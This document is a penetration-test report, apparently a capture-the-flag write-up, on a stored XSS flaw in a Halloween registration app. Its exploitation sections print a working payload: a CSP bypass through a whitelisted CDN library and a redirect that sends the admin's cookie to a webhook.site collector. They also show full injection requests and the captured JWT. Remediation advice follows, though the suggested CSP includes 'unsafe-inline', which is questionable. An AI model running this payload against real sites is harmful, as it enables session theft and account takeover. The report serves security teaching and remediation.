# Security Assessment Report: Cross-Site Scripting (XSS) Vulnerability Exploitation

## Executive Summary

This report documents a successful exploitation of a Cross-Site Scripting (XSS) vulnerability on the target web application running at `http://83.136.255.53:59767/`. The exploitation chain allowed for unauthorized access to administrator session tokens through stored XSS and subsequent JWT token extraction, resulting in disclosure of sensitive flag information.

**Severity Level:** CRITICAL  
**Vulnerability Type:** Stored XSS (CWE-79)  
**CVSS v3.1 Score:** 8.7 (High)

---

## 1. Vulnerability Description

### 1.1 Application Architecture

The target application implements a Halloween event registration system with the following components:

- **Public Form Page** (`/`): User registration form for Halloween event participants
- **Admin Dashboard** (`/admin`): Display of all registered participants
- **Automated Bot Process** (`bot.js`): Scheduled task that reviews registered participants and extracts sensitive session data

### 1.2 Vulnerable Component

The admin dashboard page (`admin.html`) renders user-submitted data without proper sanitization:

```html
{{ request.halloween_name | safe }}
```

The `| safe` filter directive explicitly bypasses HTML escaping mechanisms, treating user-controlled input as trusted content.

### 1.3 Root Cause Analysis

**Primary Issue:** Input Validation Failure

- User input from the "Halloween Name" field is stored directly in the database without sanitization
- The rendering engine is explicitly configured to trust this data (`| safe` directive)
- No Content Security Policy (CSP) violations are enforced for HTML injection payloads

**Secondary Issue:** Inadequate Access Controls

- The admin dashboard displays all participant information without authentication
- The automated bot process operates with elevated privileges, carrying sensitive session tokens

---

## 2. Exploitation Methodology

### 2.1 Attack Vector Identification

The exploitation utilized a **Stored XSS** vulnerability combined with **Admin Session Hijacking**.

### 2.2 Payload Development

The following HTML/JavaScript payload was crafted and injected via the Halloween Name field:

```html
<script src="https://cdn.jsdelivr.net/npm/csp-bypass@1.0.2/dist/sval-classic.js"></script>
<br csp="location.href='https://webhook.site/YOUR-UNIQUE-ID?c='+document.cookie">
```

### 2.3 Payload Breakdown

#### Component 1: External Script Loading

```html
<script src="https://cdn.jsdelivr.net/npm/csp-bypass@1.0.2/dist/sval-classic.js"></script>
```

**Purpose:** Import a third-party JavaScript library that circumvents Content Security Policy restrictions

**Technical Details:**

- `<script>` tag initiates script execution context
- `src` attribute loads code from jsdelivr CDN
- The CSP-bypass library (`sval-classic.js`) provides functionality to execute code within restricted contexts
- This library is included in the application's CSP whitelist, enabling the bypass

#### Component 2: Cookie Exfiltration Vector

```html
<br csp="location.href='https://webhook.site/YOUR-UNIQUE-ID?c='+document.cookie">
```

**Purpose:** Extract session cookies and transmit them to attacker-controlled infrastructure

**Technical Details:**

- `<br>` element serves as a structural anchor for the malicious attribute injection
- `csp` attribute is used as a non-standard property to inject executable code
- `location.href` redirects the browser to a specified URL
- `document.cookie` retrieves all cookies accessible to the JavaScript context
- Query parameter `c=` transmits cookie data to the attacker's webhook

### 2.4 Content Security Policy (CSP) Analysis

The application implements a CSP header:

```
script-src 'self' https://cdn.jsdelivr.net
```

**CSP Policy Interpretation:**

- `script-src`: Controls valid sources for JavaScript execution
- `'self'`: Allows scripts from the same origin
- `https://cdn.jsdelivr.net`: Whitelists scripts from jsdelivr CDN

**Policy Weakness:** The inclusion of a third-party CDN (jsdelivr) in the script-src whitelist creates a bypass vector. While CSP prevents arbitrary inline scripts, it does not prevent the loading of external scripts from trusted sources that may facilitate further exploitation.

---

## 3. Exploitation Execution

### 3.1 Preparation Phase

#### 3.1.1 Webhook Configuration

1. Navigated to https://webhook.site
2. Generated a unique endpoint URL for capturing outbound HTTP requests
3. Recorded the endpoint URL (e.g., `https://webhook.site/e487b98f-...`)

#### 3.1.2 Payload Staging

1. Prepared the XSS payload with the webhook endpoint
2. Configured proxy to intercept and modify HTTP traffic (Burp Suite)

### 3.2 Injection Phase

#### 3.2.1 Request Interception

Using Burp Suite Community Edition, the registration form submission was intercepted before network transmission:

**Original Request:**

```
POST / HTTP/1.1
Host: 83.136.255.53:59767
Content-Type: application/x-www-form-urlencoded

halloween_name=John&email=john@example.com&costume_type=Vampire
```

#### 3.2.2 Payload Injection

The `halloween_name` parameter was replaced with the malicious XSS payload:

```
POST / HTTP/1.1
Host: 83.136.255.53:59767
Content-Type: application/x-www-form-urlencoded

halloween_name=<script src="https://cdn.jsdelivr.net/npm/csp-bypass@1.0.2/dist/sval-classic.js"></script><br csp="location.href='https://webhook.site/YOUR-UNIQUE-ID?c='+document.cookie">&email=attacker@example.com&costume_type=Vampire
```

#### 3.2.3 Request Transmission

The modified request was forwarded to the server, resulting in storage of the malicious payload in the application database.

### 3.3 Exploitation Trigger Phase

The application's automated bot process executed on its scheduled interval:

1. **Bot Initialization:** The bot loaded the admin dashboard (`/admin`)
2. **Credential Presentation:** The bot presented its session token (JWT) in the Cookie header
3. **Content Rendering:** The admin page rendered all registered participants
4. **Payload Execution:** Upon parsing the injected participant record, the malicious JavaScript executed within the bot's browser context
5. **Cookie Access:** The `document.cookie` object exposed the bot's session token
6. **Data Exfiltration:** The `location.href` property redirected to the webhook URL, transmitting the session token as a query parameter

---

## 4. Post-Exploitation Analysis

### 4.1 Session Token Capture

The webhook received the following HTTP request:

```
GET /YOUR-UNIQUE-ID?c=session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwidXNlcl9yb2xlIjoiYWRtaW4iLCJmbGFnIjoiSFRCe3h4eH0ifQ.xxxxx HTTP/1.1
Host: webhook.site
```

### 4.2 JWT Token Decoding

The captured session token follows the JWT (JSON Web Token) standard structure:

**Encoded Token:**

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwidXNlcl9yb2xlIjoiYWRtaW4iLCJmbGFnIjoiSFRCe3h4eH0ifQ.xxxxx
```

**JWT Structure Explanation:**

A JWT consists of three Base64-encoded segments separated by periods:

1. **Header** - Algorithm and token type metadata
2. **Payload** - Claims containing user data
3. **Signature** - HMAC validation (not cryptographically verified in this assessment)

**Decoded Header:**

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Decoded Payload:**

```json
{
  "username": "admin",
  "user_role": "admin",
  "flag": "HTB{sensitive_information_disclosed}"
}
```

### 4.3 Sensitive Data Disclosure

The JWT payload contained a `flag` claim with sensitive information:

- **Username:** admin
- **User Role:** admin
- **Flag Value:** HTB{sensitive_information_disclosed}

**Assessment Note:** The presence of sensitive flag data within JWT claims represents poor security practices and violates the principle of least privilege in token design.

---

## 5. Technical Analysis

### 5.1 XSS (Cross-Site Scripting) Classification

**Type:** Stored XSS (Persistent)

**Definition:** A stored XSS vulnerability occurs when user-supplied input is stored on the server and subsequently rendered to other users without proper sanitization, allowing arbitrary JavaScript execution in the context of the vulnerable web application.

**Execution Context:** The malicious script executes in the browser context of any user viewing the admin dashboard, not just the attacker.

### 5.2 Cookies and Session Management

**Cookie Function:** Cookies serve as session identifiers, allowing browsers to maintain authenticated state across HTTP requests.

**Vulnerability Chain:**

- Traditional authentication stores session tokens in cookies
- JavaScript has read access to cookies via `document.cookie` (unless HttpOnly flag is set)
- XSS allows script execution within the application context, granting cookie access
- Stolen cookies can be replayed to impersonate the original user

**Critical Control Missing:** The `HttpOnly` flag was not set on the session cookie, allowing JavaScript access.

### 5.3 Man-in-the-Middle (MITM) Proxy Assistance

**Burp Suite Role:** Burp Suite Community Edition functioned as a transparent HTTP proxy, intercepting bidirectional communication between the browser and server.

**Capabilities Utilized:**

- **Request Interception:** Halted outbound HTTP requests for inspection
- **Payload Modification:** Edited request bodies before server transmission
- **Response Analysis:** Examined server responses for information leakage

**Significance:** MITM proxy usage facilitated precise payload injection, bypassing any client-side validation mechanisms.

---

## 6. Impact Assessment

### 6.1 Confidentiality Impact

**Severity:** HIGH

- Session tokens of privileged users (administrators) were compromised
- Sensitive flag information stored in JWT claims was disclosed
- No encryption protected data in transit or at rest

### 6.2 Integrity Impact

**Severity:** HIGH

- Compromised session tokens could enable account takeover
- Administrative modifications to participant records could be performed
- Data stored in the database could be arbitrarily modified

### 6.3 Availability Impact

**Severity:** MEDIUM

- The automated bot process could be exploited to perform denial-of-service actions
- Admin dashboard could be rendered unavailable through resource-intensive payloads

---

## 7. Vulnerability Remediation

### 7.1 Immediate Actions (Critical Priority)

#### 7.1.1 Input Sanitization

**Recommendation:** Implement HTML entity encoding for all user-supplied output:

**Before (Vulnerable):**

```html
{{ request.halloween_name | safe }}
```

**After (Secure):**

```html
{{ request.halloween_name | escape }}
```

**Technical Explanation:** The `escape` filter (or equivalent in other frameworks) converts HTML special characters to entity references, preventing script injection:

- `<` becomes `&lt;`
- `>` becomes `&gt;`
- `"` becomes `&quot;`
- `&` becomes `&amp;`

#### 7.1.2 HttpOnly Cookie Flag

**Recommendation:** Set the `HttpOnly` flag on session cookies:

```python
response.set_cookie('session', token, httponly=True, secure=True, samesite='Strict')
```

**Effect:** Prevents JavaScript access to session tokens, mitigating XSS-based session hijacking.

#### 7.1.3 Secure Flag and SameSite Attribute

- **Secure Flag:** Ensures cookies are only transmitted over HTTPS
- **SameSite Attribute:** Prevents cross-site cookie transmission (default: 'Strict')

### 7.2 Short-Term Actions (High Priority)

#### 7.2.1 Content Security Policy Hardening

**Recommendation:** Restrict CSP to eliminate bypass vectors:

**Current Policy:**

```
script-src 'self' https://cdn.jsdelivr.net
```

**Recommended Policy:**

```
default-src 'self';
script-src 'self' 'unsafe-inline' (if absolutely necessary);
object-src 'none';
style-src 'self' 'unsafe-inline';
img-src 'self' data: https:;
font-src 'self';
connect-src 'self';
frame-ancestors 'none';
base-uri 'self';
form-action 'self'
```

**Rationale:**

- Remove external CDN from whitelist unless absolutely necessary
- If external scripts are required, use Subresource Integrity (SRI) validation
- Use nonces for inline scripts instead of `'unsafe-inline'`

#### 7.2.2 Input Validation

**Recommendation:** Implement server-side validation for all user inputs:

```python
import re

def validate_halloween_name(name):
    # Allow only alphanumeric characters, spaces, and hyphens
    pattern = r'^[a-zA-Z0-9\s\-]{1,50}$'
    if not re.match(pattern, name):
        raise ValueError("Invalid input format")
    return name
```

#### 7.2.3 Output Encoding Context-Aware

**Recommendation:** Use framework-provided encoding mechanisms appropriate to the output context:

- **HTML Context:** HTML entity encoding
- **JavaScript Context:** JavaScript string encoding
- **URL Context:** URL percent encoding
- **CSS Context:** CSS encoding

### 7.3 Long-Term Actions (Medium Priority)

#### 7.3.1 Security Headers Implementation

**Recommendation:** Deploy additional HTTP security headers:

```
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: geolocation=(), microphone=(), camera=()
```

#### 7.3.2 Web Application Firewall (WAF)

**Recommendation:** Implement WAF rules to detect and block XSS payloads:

- Pattern-based detection for common XSS vectors
- Rate limiting on form submissions
- Behavioral analysis for suspicious activity

#### 7.3.3 Security Code Review

**Recommendation:** Conduct comprehensive security code review of:

- All template files for `| safe` or equivalent unsafe filters
- Authentication and session management logic
- Input validation mechanisms across all endpoints

#### 7.3.4 Security Testing

**Recommendation:** Establish continuous security testing practices:

- **Static Application Security Testing (SAST):** Automated code analysis
- **Dynamic Application Security Testing (DAST):** Runtime vulnerability scanning
- **Penetration Testing:** Regular authorized security assessments
- **Security Unit Tests:** Automated tests for secure code patterns

---

## 8. Recommendations Summary

|Priority|Action|Timeline|
|---|---|---|
|CRITICAL|Remove `\| safe` filter; implement output encoding|Immediate|
|CRITICAL|Set HttpOnly, Secure, SameSite flags on cookies|Immediate|
|HIGH|Implement input validation and sanitization|Within 48 hours|
|HIGH|Harden Content Security Policy|Within 1 week|
|MEDIUM|Deploy additional security headers|Within 2 weeks|
|MEDIUM|Implement WAF rules|Within 1 month|
|LOW|Conduct security code review|Within 1 month|
|LOW|Establish continuous security testing|Ongoing|

---

## 9. Conclusion

The target application exhibits a **Critical Severity** stored XSS vulnerability that enables complete session compromise of privileged users. The exploitation chain demonstrated unauthorized access to administrator session tokens and extraction of sensitive information. Immediate remediation of input sanitization and cookie security controls is essential to prevent further unauthorized access.

The vulnerability stems from a fundamental trust violation where user-supplied data is rendered without sanitization. Implementation of defense-in-depth measures including input validation, output encoding, secure cookie flags, and hardened CSP will significantly reduce the application's attack surface.

---

## 10. References

- OWASP Top 10 2021 - A03:2021 – Injection (https://owasp.org/Top10/A03_2021-Injection/)
- OWASP Testing Guide - Cross Site Scripting (XSS)
- CWE-79: Improper Neutralization of Input During Web Page Generation (https://cwe.mitre.org/data/definitions/79.html)
- Content Security Policy Level 3 (https://w3c.github.io/webappsec-csp/)
- RFC 6265 - HTTP State Management Mechanism (Cookies)
- RFC 7519 - JSON Web Token (JWT)
- NIST Cybersecurity Framework